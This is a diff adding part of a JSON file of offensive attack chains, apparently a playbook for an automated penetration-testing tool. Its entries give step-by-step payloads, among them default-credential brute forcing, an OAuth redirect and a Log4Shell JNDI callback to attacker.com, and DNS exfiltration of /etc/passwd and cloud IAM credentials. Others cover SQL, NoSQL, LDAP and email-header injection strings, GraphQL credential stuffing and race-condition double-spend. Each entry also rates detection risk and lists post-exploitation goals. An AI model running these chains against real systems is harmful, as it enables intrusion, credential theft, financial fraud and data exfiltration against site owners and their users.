+    "name": "Default Credentials to Internal Network Pivot",
+    "description": "Exploit default admin credentials to access management console and pivot to internal network",
+    "triggers": ["default credentials", "admin/admin", "management console", "panel"],
+    "steps": [
+      {"order": 1, "description": "Identify admin panel: /admin, /manager, /console", "tool_hint": "nuclei", "success_criteria": "Login page found"},
+      {"order": 2, "description": "Test default creds: admin/admin, admin/password, tomcat/tomcat", "tool_hint": "hydra", "success_criteria": "Login successful"},
+      {"order": 3, "description": "Access management features: deploy, execute, config", "tool_hint": "manual", "success_criteria": "Privileged action available"},
+      {"order": 4, "description": "Deploy malicious app or execute system command", "tool_hint": "manual", "success_criteria": "RCE confirmed"}
+    ],
+    "required_findings": ["admin", "default"],
+    "severity": "HIGH",
+    "estimated_time": "30-60 minutes",
+    "detection_risk": "MEDIUM",
+    "prerequisites": ["Default credentials unchanged", "Management console exposed", "No MFA"],
+    "post_exploitation": ["Full admin access", "App deployment", "Network pivot"]
+  },
+  {
+    "id": "open_redirect_to_oauth_theft",
+    "name": "Open Redirect to OAuth Token Theft",
+    "description": "Exploit open redirect in OAuth flow to steal authorization codes",
+    "triggers": ["open redirect", "oauth", "redirect_uri", "return_url"],
+    "steps": [
+      {"order": 1, "description": "Find open redirect: /redirect?url=https://attacker.com", "tool_hint": "manual", "success_criteria": "Redirect accepted"},
+      {"order": 2, "description": "Craft OAuth URL: /authorize?client_id=X&redirect_uri=https://target.com/redirect?url=https://attacker.com", "tool_hint": "manual", "success_criteria": "OAuth flow initiated"},
+      {"order": 3, "description": "Victim authorizes, redirected to attacker.com with code", "tool_hint": "manual", "success_criteria": "Auth code in Referer"},
+      {"order": 4, "description": "Exchange code for access token", "tool_hint": "curl", "success_criteria": "Token obtained"}
+    ],
+    "required_findings": ["redirect", "oauth"],
+    "severity": "HIGH",
+    "estimated_time": "1-2 hours",
+    "detection_risk": "LOW",
+    "prerequisites": ["OAuth implementation", "Open redirect in redirect_uri chain"],
+    "post_exploitation": ["Account takeover", "API access", "Session hijacking"]
+  },
+  {
+    "id": "sqli_to_hash_dump_and_crack",
+    "name": "SQLi to Password Hash Dump and Crack",
+    "description": "Dump password hashes via SQLi and crack offline with hashcat",
+    "triggers": ["sql injection", "password hash", "users table", "md5", "bcrypt"],
+    "steps": [
+      {"order": 1, "description": "Confirm SQLi and extract database name", "tool_hint": "sqlmap", "success_criteria": "Database name obtained"},
+      {"order": 2, "description": "Dump users table: UNION SELECT email, password FROM users", "tool_hint": "sqlmap", "success_criteria": "Hashes obtained"},
+      {"order": 3, "description": "Identify hash type: MD5, SHA256, bcrypt", "tool_hint": "hashid", "success_criteria": "Hash type determined"},
+      {"order": 4, "description": "Crack with hashcat: -m 0 (MD5), -m 100 (SHA1), -m 3200 (bcrypt)", "tool_hint": "hashcat", "success_criteria": "Plaintext passwords recovered"}
+    ],
+    "required_findings": ["sql injection", "hash"],
+    "severity": "HIGH",
+    "estimated_time": "1-6 hours",
+    "detection_risk": "MEDIUM",
+    "prerequisites": ["SQLi with UNION extraction", "Password hashes in DB", "Weak hashing (MD5/SHA1)"],
+    "post_exploitation": ["Credential breach", "Account takeover", "Password reuse attacks"]
+  },
+  {
+    "id": "log4shell_jndi_rce",
+    "name": "Log4Shell JNDI Injection to RCE",
+    "description": "Exploit Log4j JNDI injection to achieve RCE via LDAP/RMI callback",
+    "triggers": ["log4j", "log4shell", "jndi", "java", "ldap injection"],
+    "steps": [
+      {"order": 1, "description": "Identify Java app with Log4j (User-Agent logging, error logs)", "tool_hint": "manual", "success_criteria": "Log4j confirmed"},
+      {"order": 2, "description": "Inject JNDI: ${jndi:ldap://attacker.com/a}", "tool_hint": "manual", "success_criteria": "LDAP callback received"},
+      {"order": 3, "description": "Host malicious LDAP server returning Exploit.class", "tool_hint": "rogue_jndi", "success_criteria": "Class loaded on target"},
+      {"order": 4, "description": "Execute payload: reverse shell or command", "tool_hint": "manual", "success_criteria": "RCE confirmed"}
+    ],
+    "required_findings": ["log4j", "java"],
+    "severity": "CRITICAL",
+    "estimated_time": "1-2 hours",
+    "detection_risk": "HIGH",
+    "prerequisites": ["Log4j 2.0-2.14.1", "JNDI allowed", "Outbound LDAP/RMI permitted"],
+    "post_exploitation": ["Full server compromise", "Data exfiltration", "Lateral movement"]
+  },
+  {
+    "id": "blind_ssrf_to_oob_exfil",
+    "name": "Blind SSRF to OOB Data Exfiltration",
+    "description": "Exfiltrate internal data via blind SSRF using DNS subdomain encoding",
+    "triggers": ["ssrf", "blind ssrf", "oob", "dns callback"],
+    "steps": [
+      {"order": 1, "description": "Confirm blind SSRF: DNS callback to interactsh", "tool_hint": "interactsh", "success_criteria": "DNS received"},
+      {"order": 2, "description": "Exfil via DNS: http://$(whoami|base64).attacker.com", "tool_hint": "manual", "success_criteria": "Subdomain decoded to command output"},
+      {"order": 3, "description": "Read internal file: http://$(cat /etc/passwd|base64).attacker.com", "tool_hint": "manual", "success_criteria": "File content exfiltrated"},
+      {"order": 4, "description": "Extract cloud metadata: http://$(curl 169.254.169.254/latest/meta-data/iam|base64).attacker.com", "tool_hint": "manual", "success_criteria": "IAM credentials obtained"}
+    ],
+    "required_findings": ["ssrf", "blind"],
+    "severity": "HIGH",
+    "estimated_time": "1-2 hours",
+    "detection_risk": "LOW",
+    "prerequisites": ["Blind SSRF", "Outbound DNS allowed", "Command execution in URL context"],
+    "post_exploitation": ["Data exfiltration", "Credential theft", "Internal enumeration"]
+  },
+  {
+    "id": "graphql_batching_to_credential_stuffing",
+    "name": "GraphQL Batching to Credential Stuffing",
+    "description": "Abuse GraphQL batched mutations to bypass rate limiting for credential stuffing",
+    "triggers": ["graphql", "batching", "login mutation", "rate limit bypass"],
+    "steps": [
+      {"order": 1, "description": "Identify login mutation: mutation { login(email:, password:) }", "tool_hint": "introspection", "success_criteria": "Mutation signature found"},
+      {"order": 2, "description": "Craft batch request: [{\"query\":\"mutation{login(e:'a',p:'x')}\"}, ...] x1000", "tool_hint": "manual", "success_criteria": "All mutations processed"},
+      {"order": 3, "description": "Analyze responses: different length/error for valid credentials", "tool_hint": "manual", "success_criteria": "Valid creds identified"},
+      {"order": 4, "description": "Login with valid credentials", "tool_hint": "manual", "success_criteria": "Account access confirmed"}
+    ],
+    "required_findings": ["graphql", "login"],
+    "severity": "HIGH",
+    "estimated_time": "2-4 hours",
+    "detection_risk": "MEDIUM",
+    "prerequisites": ["GraphQL batching enabled", "No per-mutation rate limit", "Differential response"],
+    "post_exploitation": ["Account takeover", "Credential breach", "Data theft"]
+  },
+  {
+    "id": "account_enum_to_brute_force",
+    "name": "Account Enumeration to Targeted Brute Force",
+    "description": "Enumerate valid usernames via differential response, then brute force passwords",
+    "triggers": ["account enumeration", "username discovery", "login", "password reset"],
+    "steps": [
+      {"order": 1, "description": "Test registration: admin@target.com vs random@target.com", "tool_hint": "manual", "success_criteria": "Different error messages"},
+      {"order": 2, "description": "Enumerate via password reset: 'user exists' vs 'user not found'", "tool_hint": "turbo_intruder", "success_criteria": "Valid user list built"},
+      {"order": 3, "description": "Brute force with valid usernames: hydra -l admin -p rockyou.txt", "tool_hint": "hydra", "success_criteria": "Password cracked"},
+      {"order": 4, "description": "Login with cracked credentials", "tool_hint": "manual", "success_criteria": "Account access confirmed"}
+    ],
+    "required_findings": ["enumeration", "login"],
+    "severity": "MEDIUM",
+    "estimated_time": "2-6 hours",
+    "detection_risk": "HIGH",
+    "prerequisites": ["Differential error messages", "No rate limiting", "Weak passwords"],
+    "post_exploitation": ["Account takeover", "PII access", "Lateral movement"]
+  },
+  {
+    "id": "nosql_injection_to_data_theft",
+    "name": "NoSQL Injection to Mass Data Theft",
+    "description": "Exploit NoSQL operator injection to bypass auth and exfiltrate database",
+    "triggers": ["nosql", "mongodb", "json injection", "$where", "$ne"],
+    "steps": [
+      {"order": 1, "description": "Confirm NoSQLi: {\"username\":{\"$ne\":null},\"password\":{\"$ne\":null}}", "tool_hint": "manual", "success_criteria": "Auth bypassed"},
+      {"order": 2, "description": "Enumerate collections: {\"$where\":\"this.constructor.name=='Collection'\"}", "tool_hint": "manual", "success_criteria": "Collection names obtained"},
+      {"order": 3, "description": "Dump users: {\"$where\":\"return true\"} with projection {email:1, password:1}", "tool_hint": "manual", "success_criteria": "User data extracted"},
+      {"order": 4, "description": "Blind extraction: {\"password\":{\"$regex\":\"^a\"}} — iterate chars", "tool_hint": "nosqlmap", "success_criteria": "Full DB dumped"}
+    ],
+    "required_findings": ["nosql", "mongodb"],
+    "severity": "CRITICAL",
+    "estimated_time": "1-3 hours",
+    "detection_risk": "MEDIUM",
+    "prerequisites": ["MongoDB/CouchDB", "Operator injection possible", "No input validation"],
+    "post_exploitation": ["Full database dump", "Credential theft", "Data breach"]
+  },
+  {
+    "id": "ldap_injection_to_auth_bypass",
+    "name": "LDAP Injection to Authentication Bypass",
+    "description": "Exploit LDAP filter injection to bypass auth and enumerate directory",
+    "triggers": ["ldap", "active directory", "saml", "adfs", "ou=", "dc="],
+    "steps": [
+      {"order": 1, "description": "Confirm LDAPi: admin*)(uid=*))(|(uid=*", "tool_hint": "manual", "success_criteria": "Auth bypassed"},
+      {"order": 2, "description": "Enumerate users: admin*)(uid=*))(|(uid=*a*) — check response delta", "tool_hint": "manual", "success_criteria": "User list built"},
+      {"order": 3, "description": "Extract attributes: *(objectClass=*))(|(objectClass=*)", "tool_hint": "manual", "success_criteria": "mail, memberOf obtained"},
+      {"order": 4, "description": "Dump full directory via automated script", "tool_hint": "manual", "success_criteria": "AD compromised"}
+    ],
+    "required_findings": ["ldap", "active directory"],
+    "severity": "CRITICAL",
+    "estimated_time": "1-2 hours",
+    "detection_risk": "MEDIUM",
+    "prerequisites": ["LDAP authentication", "Unsanitized input", "Anonymous bind allowed"],
+    "post_exploitation": ["Auth bypass", "Directory enumeration", "Credential theft"]
+  },
+  {
+    "id": "race_condition_to_double_spend",
+    "name": "Race Condition to Double-Spend Attack",
+    "description": "Exploit race condition in financial endpoint for double-spend or coupon abuse",
+    "triggers": ["race condition", "concurrent", "double-spend", "coupon", "transfer"],
+    "steps": [
+      {"order": 1, "description": "Identify state-changing endpoint: /transfer, /redeem, /withdraw", "tool_hint": "manual", "success_criteria": "Target endpoint found"},
+      {"order": 2, "description": "Send 50 concurrent requests with same payload", "tool_hint": "turbo_intruder", "success_criteria": "Multiple applications successful"},
+      {"order": 3, "description": "Verify impact: balance negative, coupon used 50x", "tool_hint": "manual", "success_criteria": "Financial impact confirmed"},
+      {"order": 4, "description": "Document PoC: video + request logs", "tool_hint": "manual", "success_criteria": "Reproducible PoC"}
+    ],
+    "required_findings": ["race condition", "financial"],
+    "severity": "CRITICAL",
+    "estimated_time": "1-2 hours",
+    "detection_risk": "MEDIUM",
+    "prerequisites": ["No optimistic locking", "No idempotency key", "Weak transaction isolation"],
+    "post_exploitation": ["Financial fraud", "Coupon abuse", "Data manipulation"]
+  },
+  {
+    "id": "email_injection_to_spam_relay",
+    "name": "Email Header Injection to Spam Relay",
+    "description": "Abuse contact form as spam relay via CC/BCC header injection",
+    "triggers": ["email", "contact form", "invite", "feedback", "cc:", "bcc:"],
+    "steps": [
+      {"order": 1, "description": "Identify email functionality: contact, invite, feedback", "tool_hint": "manual", "success_criteria": "Email form found"},
+      {"order": 2, "description": "Inject CC: name%0ACc:victim1@example.com,victim2@example.com", "tool_hint": "manual", "success_criteria": "Emails sent to victims"},
+      {"order": 3, "description": "Forge sender: subject=Invoice%0AFrom:billing@target.com", "tool_hint": "manual", "success_criteria": "Email appears from target.com"},
+      {"order": 4, "description": "Mass spam: automate injection for bulk sending", "tool_hint": "script", "success_criteria": "Spam relay confirmed"}
+    ],
+    "required_findings": ["email", "contact"],
+    "severity": "MEDIUM",
+    "estimated_time": "30-60 minutes",
+    "detection_risk": "HIGH",
+    "prerequisites": ["String concatenation in email", "No header sanitization", "Mail server allows relay"],
+    "post_exploitation": ["Spam relay", "Phishing from trusted domain", "Reputation damage"]
+  }
+  ]
+}
